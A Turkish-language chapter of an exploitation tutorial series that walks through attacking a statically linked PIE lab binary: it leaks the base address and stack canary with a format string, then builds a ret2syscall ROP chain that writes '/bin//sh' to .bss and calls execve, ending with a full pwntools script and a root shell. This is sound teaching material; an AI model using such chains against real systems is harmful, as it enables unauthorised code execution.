# Hedefimiz
Yine önceki bölümlerle aynı hedefe sahibiz, programın akışını değiştirerek
bir shell çalıştırmak istiyoruz.

# Kod analizi
Kodumuz önceki bölüm ile birebir aynı, bu sefer başka bir derleme opsyinu ekledik: `-static-pie`

### Statik bir dinamik
UNIX gibi işletim sistemlerinde, bir ELF dosyasını `execve()` gibi sistem çağrıları ile çalıştırdığınızda,
çekirdek bu yeni program için bir bellek alanı ayarlar, programın kodunu bu bellek alanına yükler ve programı
çalıştırır. Bu işlem yüzeysel bir biçimde bu şekilde açıklansada [özünde çok daha karmaşıktır](https://lwn.net/Articles/631631/).

ELF dosyasını çalıştırmadan önce, ELF header'ında yer alan önemli yapılardan biri [program header table](https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html)'ıdır.
Bu header table'daki, her bir header, programı çalıştrmadan önce sistemin yapması gerekenler hakkında çeşitli
bilgiler içerir. Bizim ilgilendiğimiz header tipi `PT_INTERP`. Bu tip header yapısı, ELF için kullanılan linker'ın yolunu belirtir.
Bu linkere aynı zamanda kafa karıştıcı bir şekilde "interpreter" da deniyor ancak biz linkerla devam edeceğiz.

Sistem, ELF dosyasını yüklediği şekilde linker'ı çalıştırmak adına belleğe yükler, sonsuz bir döngüyü önlemek
adına linker'ın kendi kendisine linklenmediğinden emin olur, ardından linker'a ELF dosyasına işaret eden bir
file descriptor verir. Linker, [relocation](https://refspecs.linuxbase.org/elf/gabi4+/ch4.reloc.html)'ları yapmak,
üzerinde çalıştığı spesifik platform için gerekli çağrıları kullanarak kendi kullanımı için bir bellek alanı oluşturmak
gibi önemli işlerini tamamladıktan sonra, ELF dosyasında, `DYNAMIC` bölgesi altında belirtilen `DT_NEEDED` olarak işaretlenmiş
`Elf64_Dyn` tanımlarına bakar. Bu veri yapısı programın ihtiyaç duyduğu shared object'lerin yani `.so` uzantılı kütüphanelerin
yollarını içerir.

Linker, bu kütüphaneleri belleğe yolladıktan sonra başlangıç fonksiyonunu çağrır (bu durumda bu `glibc`'nin `init` fonksiyonu olacaktır).
Bu çağrı eğer bir kütüphaneye aitse, kütüphane gerekli ayarlarını yaptıktan sonra son olarak bizim programımızın `main`
fonksiyonunu çağrır ve kodumuz çalışmaya başlar.

**Dinamik linklenmiş programlar** özünde böyle çalışır. Tabi birçok detayı ele almadık ama bunun sebebi bütün detaylara ihtiyaç duymadığımız gerçeği.

Popüler GNU/Linux sistemlerinde çoğu program dinamik linklidir. Bunun amacı statik linkleme sonucu ortaya çıkan büyük
program boyutlarını önlemek.

Fakat bu durum çok açık bir soruna sebep oluyor. Ya bir programın ihtiayıcı olan shared object, yani kütüphane sistemde yoksa?
Bu durumda programı çalıştıramayız. Ya da daha kötüsü ya programın ihtiyacı olan linker mevcut değilse? Ya da varolan kütüphanenin
versiyonu programın ihtiyacı olan versiyondan daha eskiyse? Bu sebeplerden ötürü dinamik linki programlar pek taşınabilir değiller.
Her farklı GNU/Linux dağıtımında farklı paket sistemleri ve bağımsız paketler olmasının ana sebpelerinden biri de bu zaten.

**Statik linklenmiş programlar** bize bu açıdan bir alternatif sağlar, programınızı statik bir şekilde inşa ederseniz,
dinamik kütüphanelere ve de linker'a ihtiyaç duymadan programı doğrudan çalıştırabilirsiniz. Çünkü statik olarak inşa edilmiş
bir programda, gerekli olan tüm kütüphane fonksiyonları programın içindedir. Yani bir bakıma program kütüphaneyle beraber gelir.

Yani bu program, `-static-pie` ile derlendiğinden, çalışırken belleğe herhangi bir kütüphane yüklemiyor (ve ayrıca PIE olduğundan ASLR
tarafından korunuyor). Bunu `gdb`'de görebiliriz:
```
root@o101:~/0x5# gdb ./0x5.elf
...
(gdb) r
Starting program: /root/0x5/0x5.elf
Hello, what's your name?
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7f7327d in read ()
(gdb) info proc map
process 1004
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x7ffff7f25000     0x7ffff7f29000     0x4000        0x0  r--p   [vvar]
      0x7ffff7f29000     0x7ffff7f2a000     0x1000        0x0  r-xp   [vdso]
      0x7ffff7f2a000     0x7ffff7f33000     0x9000        0x0  r--p   /root/0x5/0x5.elf
      0x7ffff7f33000     0x7ffff7fc8000    0x95000     0x9000  r-xp   /root/0x5/0x5.elf
      0x7ffff7fc8000     0x7ffff7ff3000    0x2b000    0x9e000  r--p   /root/0x5/0x5.elf
      0x7ffff7ff3000     0x7ffff7ff7000     0x4000    0xc9000  r--p   /root/0x5/0x5.elf
      0x7ffff7ff7000     0x7ffff7ffa000     0x3000    0xcd000  rw-p   /root/0x5/0x5.elf
      0x7ffff7ffa000     0x7ffff8021000    0x27000        0x0  rw-p   [heap]
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
```

# Exploit
Farkında olduğunuz gibi şuana kadar exploit etiğimiz tüm programlar dinamik olarak linklenmişti. O yüzden `libc` aracılığı
ile ROP yapmamız gereken durumlarda, `libc`nin başlangıç adresini hesaplayıp, offset'ler falan kullandık. Çünkü program çalıştığında
ASLR'dan ötürü linker'ın `libc`yi nereye yükleyeceğini bilmiyorduk.

Bu sefer durum farklı, elimizde statik bir program var. İlk olarak bunun pek bir sorun oluşturmayacğını düşünebilirsiniz.
"Ah, tek yapmamız gereken `libc` adreslerine dönmek yerine doğrudan ELF içindeki adreslere dönmek, değil mi?"

Şey... tam olarak değil. "Bir bakıma program kütüphane ile beraber gelir" dediğimde tam olarak doğru söylemiyordum. Linker'lar genelde
programın inşası sırasında, kütüphanelerden gelen ve kullanılmayan kodu, zaten büyük olan statik programın boyutunu daha da şişirmemek adına
programa eklemiyorlar.

Bu da demek oluyor ki, önceki exploitimizde kullandığımız `system()` çağrısı ve kullandığımız bazı ROP gadget'ları programa dahil olmayabilir:
```
root@o101:~/0x5# readelf -s 0x5.elf | grep system
   661: 00000000000b80e0    32 OBJECT  LOCAL  DEFAULT   15 system_dirs_len
   662: 00000000000b8100    66 OBJECT  LOCAL  DEFAULT   15 system_dirs
root@o101:~/0x5#
```
Gördüğünüz gibi `system()` fonksiyonu bu programda mevcut değil. Yani `system()` aracılığı ile bir shell almamız mümkün değil. Daha kötüsü,
programın içinde, bir shell çalıştırmamızı sağlyacak hiçbir fonksiyon bulunmayabilir. Bu durumda dönüş adresini, sadece hali hazırda bulunan
kod parçalarına atlayacak şekilde manipüle ederek bir shell almamız imkansız. Sonuçta olmayan bir adrese dönemeyiz ya?

### ret2sys
Bu sorunun bir çözümü var. Evet, hali hazırda varolan `libc` ya da program  ile bir shell almamız mümkün değil. Ancak illa da bir fonksiyonu
çağırmak zorunda değiliz ya? Sonuçta tüm bu ROP gadgetlarına sahibiz. Tüm bu gadget'lar aracılığı ile doğrudan Linux çekirdeğinin sistem çağrılarına
erişebiliriz.

Tahmin ediyorum ki çoğunuz sistem çağrılarının ne olduğunu bliyordur. Ancak küçük bir hatırlatma olarak,
[sistem çağrıları](https://wiki.osdev.org/System_Calls) (kısaca "syscalls") işlemcinin ring 3, yani userland'den, ring 0 yani kernel'e geçiş
yapmasını sağlayan araçlar.

Bu sistem çağrıları, kernel tarafından programlara sağlanır ve programlar genelde bu çağrıları `libc` gibi kütüphaneler aracılığı ile kullanarak
kernel ile haberleşip farklı kaynaklara erişim sağlar.

Elimizde `libc`deki bütün fonksiyonlar var olmadığından annemizi olan `libc`nin eteğinden çekiştererek "anne bunu istiyorum, şunu istiyorum"
dememiz bu durumda mümkün değil. Ancak `libc`nin perdenin arkasında çağırdığı sistem çağrılarını doğrudan kendimiz çağırabiliriz. Dönüş adreslerini
değiştirerek sistem çağrılarını çağırarak yapılan bu ROP saldrısına *ret2sys* deniyor.

Bu exploit için bir shell istiyoruz. O halde anlık çalışan programı, başka bir program ile değiştiren `execve` sistem çağrısını kullanabiliriz.
Hadi manueli inceleyelim:
```
SYNOPSIS
       #include <unistd.h>

       int execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[]);

DESCRIPTION
       execve()  executes the program referred to by pathname.  This causes the program that is currently being run
       by the calling process to be replaced with a new program, with newly initialized stack, heap, and  (initial‐
       ized and uninitialized) data segments.
       #include <unistd.h>
```
Yani tek yapmamız gereken 3 tane basit parametre ayarlayıp `execve` sistem çağrısını çağırmak, bunu nasıl yapabiliriz?

### Sistem çağrılarını çağırmak
Sistem çağrılarını çağırmadan önce, aslında ayarlamamız gereken bazı registerlar mevcut. Bunların güzel bir tablosunu
[bu sitede](https://x64.syscall.sh/) bulabilirsiniz. Bu sistem çağrılarının [calling convention](https://en.wikipedia.org/wiki/Calling_convention)'ı
yani çağrı yöntemleridir.

Bu çağrı yönteminde, x64 bit sistemlerde:
- `rax`: hangi çağrıyı kullandığımızı belirten numarayı tutar
- `rdi`: ilk argüman
- `rsi`: ikinci argüman
- `rdx`: üçüncü argüman
- `r10`: dördüncü arügman
- `r8`: beşinci arügman
- `r9`: altıncı arügman

olarak kullanılır. Ve klasik x64 çağrı yöntemlerinde olduğu gibi `rax` çağrı sonucunda dönüş değerini tutar.

Bizim `execve` çağrısı için:
- `rax`: 59
- `rdi`: shell'imiz olan `/bin/sh` karakter dizesinin adresi
- `rsi`: `NULL` (0)
- `rdx`: `NULL` (0)

olması lazım. O halde bazı gadget'lara ihtiyacımız olacak. Hadi kolay olan argümanlar ile başlayalım,
`rsi` ve `rdx`i `NULL` yani `0` yapmamız lazım:
```
root@o101:~/0x5# ropper --file 0x5.elf --search "pop rdx;"
...
0x000000000008da77: pop rdx; pop rbx; ret;
...
```
Doğrudan `pop rdx` içeren bir gadget mevcut değil, o yüzden bunu kullanmamız gerecek. Devam edelim, şimdi
`rsi` için aynısı lazım:
```
root@o101:~/0x5# ropper --file 0x5.elf --search 'pop rsi;'
...
0x00000000000173c2: pop rsi; ret;
...
```
Bu sefer doğrudan `pop rsi` içeren bir gadget mevcut.

Şimdi zor kısma geldik, nasıl `/bin/sh` karakter dizesinin adresini `rdi`'a yerleştireceğiz?
Bunun için ilk olarak `/bin/sh`ın bellekte belirli bir adreste erişilebilir olması gerekir, ki adresini alabilelim.

Ancak `strings` ile kontrol edersek, linker optimizasyonundan dolayı `libc` içinde olan bu karakter dizesi statik
binary'e dahil değil:
```
strings -a -t x 0x5.elf | grep "/bin/sh"
```
Bu durumda, bu karakter dizesini belleğe kendimiz yerleştirmemiz gerecek. Tabiki de ilk olarak bellekte yazabileceğimiz bir alan lazım,
bunun için ELF dosyasının `.bss` alanını kullanabiliriz. Bu okuma ve yazma izni olan, serbest bir belllek alanı ve genelde statik değişkenler
için kullanılıyor.

Bu alanın adresini tutabilecek bir register lazım, `rdi`ı zaten her türlü kullanacağız, `rdi`yı deneyelim:
```
root@o101:~/0x5# ropper --file 0x5.elf --search 'pop rdi;'
...
0x0000000000009e50: pop rdi; ret;
...
```
Güzel, şimdi `rdi`da tutulan adrese yazmamızı izin verecek birşey lazım:
```
root@o101:~/0x5# ropper --file 0x5.elf --search 'mov qword ptr'
...
0x0000000000041166: mov qword ptr [rdi], rcx; ret;
...
```
Bu harika bir gadget çünkü diğer ihtiyacımız olan registerlar'ı modifiye etmiyor, `rcx`i kullanıyor.
`rcx`i modifye etmenin bir yolu lazım sadece:
```
root@o101:~/0x5# ropper --file 0x5.elf --search 'pop rcx;'
...
0x0000000000041806: pop rcx; tzcnt eax, eax; ret;
...
```
Harika ötesi, son olarak `rax` için bir gadget lazım:
```
root@o101:~/0x5# ropper --file 0x5.elf --search 'pop rax;'
...
0x0000000000049327: pop rax; ret;
...
```
Bunların hepsini ayarladıktan sonra sistem çağrısını çağırmamız lazım. Farklı mimarilerde bunu yapmanın farklı yolları var.

x64 için hızlı bir şekilde sistem çağrısına girilmesini sağlayan AMD'nin `syscall` instruction'ı mevcut. Benzer bir şekilde  Intel'in Pentium II ile ortaya
attığı `systenter` instruction'ı da var. Ancak 64 bit bir kernel için [her iki işlemcide de uyumlu olan instruction](https://wiki.osdev.org/SYSENTER#Compatibility_across_Intel_and_AMD)
AMD'nin `syscall` instruction'ı.

Bunu da `ropper` ile bulabiliriz, ancak pwntools'un başka bir özelliğini daha gösterip sizi `ropper` ile gadget arama eziyetinden
kurtarmak istiyorum o yüzden hadi şimdi herşeyi birleştirelim.

### Hepsini birleştirmek
İlk olarak leaklediğimiz base adresi artık ELF'in adresi, o yüzden kullandığımız offseti değiştirmemiz gerekecek:
```
root@o101:~/0x5# gdb ./0x5.elf
(gdb) r
Starting program: /root/0x5/0x5.elf
Hello, what's your name?
%5$p,%13$p
0x7ffff7ff7520,0xf8ac48df3110f500? [yes/no]
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7f7327d in read ()
(gdb) info proc map
process 1313
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x7ffff7f25000     0x7ffff7f29000     0x4000        0x0  r--p   [vvar]
      0x7ffff7f29000     0x7ffff7f2a000     0x1000        0x0  r-xp   [vdso]
      0x7ffff7f2a000     0x7ffff7f33000     0x9000        0x0  r--p   /root/0x5/0x5.elf
      0x7ffff7f33000     0x7ffff7fc8000    0x95000     0x9000  r-xp   /root/0x5/0x5.elf
      0x7ffff7fc8000     0x7ffff7ff3000    0x2b000    0x9e000  r--p   /root/0x5/0x5.elf
      0x7ffff7ff3000     0x7ffff7ff7000     0x4000    0xc9000  r--p   /root/0x5/0x5.elf
      0x7ffff7ff7000     0x7ffff7ffa000     0x3000    0xcd000  rw-p   /root/0x5/0x5.elf
      0x7ffff7ffa000     0x7ffff8021000    0x27000        0x0  rw-p   [heap]
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
(gdb)
```
Yeni offset'imizi, `libc` offset'ini öğrenmek için yaptığımız gibi, programın başlangıç adresinden leaklediğimiz
adresi çıkartarak hesaplayabiliriz:
```
root@o101:~/0x5# python3
Python 3.11.2 (main, Sep 14 2024, 03:00:30) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x7ffff7ff7520-0x7ffff7f2a000)
'0xcd520'
```
Yeni offset'imiz `0xcd520`, şimdi pwntools ile yazdığımız, önceki bölümden kalma exploitimizi `libc`nin base adresi yerine
ELF'in base adresini güncelleyecek şekilde değiştirelim:
```python
p.recvuntil(b"\n")
p.sendline(b"%5$p,%13$p,")
line   = p.recvline().split(b",")
leak   = line[0]
cookie = line[1]
info(f"Leaked address: {leak.decode()}")
info(f"Leaked cookie: {cookie.decode()}")

elf.address = int(leak, 16) - 0xcd520
info(f"Found base: {hex(elf.address)}")
```
Şimdi asıl overflow kısmına gelelim, bu kısımda bir değişikliğe gerek yok:
```python
payload  = b"A"*56                  # answer + name
payload += p64(int(cookie, 16))     # cookie
payload += b"A"*8                   # rbp
```
Güzel, şimdi payload'ımızın dönüş adreslerini modifye eden kısmına geldiğimize göre ret2sys saldırımızı pratiğe geçirebiliriz.
Önce ilk gadget'ımız ile `rdx`i sıfırlamak ile başlayalım:
```python
payload += p64(elf.address+0x8da77) # pop rdx; pop rbx; ret;
payload += p64(0)                   # rdx
payload += p64(0)                   # rbx
```
Şimdi sırada `rsi`da, ikinci gadget'ımızı kullanacağız:
```python
payload += p64(elf.address+0x173c2) # pop rsi; ret;
payload += p64(0)                   # rsi
```
Şimdi `/bin/sh`ı `.bss`e yükleyelim. `/bin/sh` normalde 7 karakter ancak `rcx` registerını tamamını `pop`'latığımızdan
bize 8 karakter lazım, bunu kolayca ek bir `/` ekleyerek yapabiliriz. Sonuçta `/bin//sh` hala geçerli bir yol.

Bu `/bin/sh`ı bu adrese yüklemek için, sırasıyla üçüncü, beşinci ve dördüncü gadget'ımızı kullanacağız.
```python
payload += p64(elf.address+0x09e50) # pop rdi; ret;
payload += p64(elf.bss())           # rdi
payload += p64(elf.address+0x41806) # pop rcx; tzcnt eax, eax; ret;
payload += b"/bin//sh"              # rcx
payload += p64(elf.address+0x41166) # mov qword ptr [rdi], rcx; ret;
```
`/bin/sh`ı artık `.bss`de oturuyor. Adresine direk `elf.bss()` ile erişebiliyoruz. Sadece bu adresi `rdi`a yüklememiz lazım:
```python
payload += p64(elf.address+0x09e50) # pop rdi; ret;
payload += p64(elf.bss())           # rdi
```
Son olarak, `rax`i ayarlamamız lazım, bunun içinse son gadget'ımızı kullanacağız:
```python
payload += p64(elf.address+0x49327) # pop rax; ret;
payload += p64(59)                  # rax
```
Artık `syscall` instruction'ınını çağırabiliriz. Bunu `ropper` ile bulmadık, çünkü aslında pwntools ile dinamik bir şekilde
ROP gadget'ları bulmamız mümkün, ben de size göstermek istedim. Fakat bu pwntools özelliği `ropper` kadar iyi çalışmıyor o yüzden
kompleks gadget'lar için hala `ropper`ı kullanmak isteyebilirsiniz:
```python
rop = ROP(elf)
syscall = rop.find_gadget(["syscall"]).address
payload += p64(syscall)
```
Tüm payload'ı hazırladığımıza göre geri kalan şeyleri ekleyerek tüm explotimizi oluşturabiliriz:
```python
from pwn import *

context.update(arch="amd64", os="linux")
elf = context.binary = ELF("./0x5.elf")
p = process("./0x5.elf")

p.recvuntil(b"\n")
p.sendline(b"%5$p,%13$p,")
line   = p.recvline().split(b",")
leak   = line[0]
cookie = line[1]
info(f"Leaked address: {leak.decode()}")
info(f"Leaked cookie: {cookie.decode()}")

elf.address = int(leak, 16) - 0xcd520
info(f"Found base: {hex(elf.address)}")

payload  = b"A"*56                  # answer + name
payload += p64(int(cookie, 16))     # cookie
payload += b"A"*8                   # rbp

payload += p64(elf.address+0x8da77) # pop rdx; pop rbx; ret;
payload += p64(0)                   # rdx
payload += p64(0)                   # rbx

payload += p64(elf.address+0x173c2) # pop rsi; ret;
payload += p64(0)                   # rsi

payload += p64(elf.address+0x09e50) # pop rdi; ret;
payload += p64(elf.bss())           # rdi
payload += p64(elf.address+0x41806) # pop rcx; tzcnt eax, eax; ret;
payload += b"/bin//sh"              # rcx
payload += p64(elf.address+0x41166) # mov qword ptr [rdi], rcx; ret;

payload += p64(elf.address+0x09e50) # pop rdi; ret;
payload += p64(elf.bss())           # rdi

payload += p64(elf.address+0x49327) # pop rax; ret;
payload += p64(59)                  # rax

rop = ROP(elf)
syscall = rop.find_gadget(["syscall"]).address
payload += p64(syscall)

p.sendline(payload)
p.interactive()
```
Hadi exploitimizi çalıştırıp deneyelim:
```
root@o101:~/0x5# python3 solve.py
[!] Did not find any GOT entries
[*] '/root/0x5/0x5.elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './0x5.elf': pid 1454
[*] Leaked address: 0x7ffff7ff7520
[*] Leaked cookie: 0x1fb4a36be795cc00
[*] Found base: 0x7ffff7f2a000
[*] Loaded 121 cached gadgets for './0x5.elf'
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$
```

---
[Önceki](0x4.md) | [Sonraki](0x6.md)
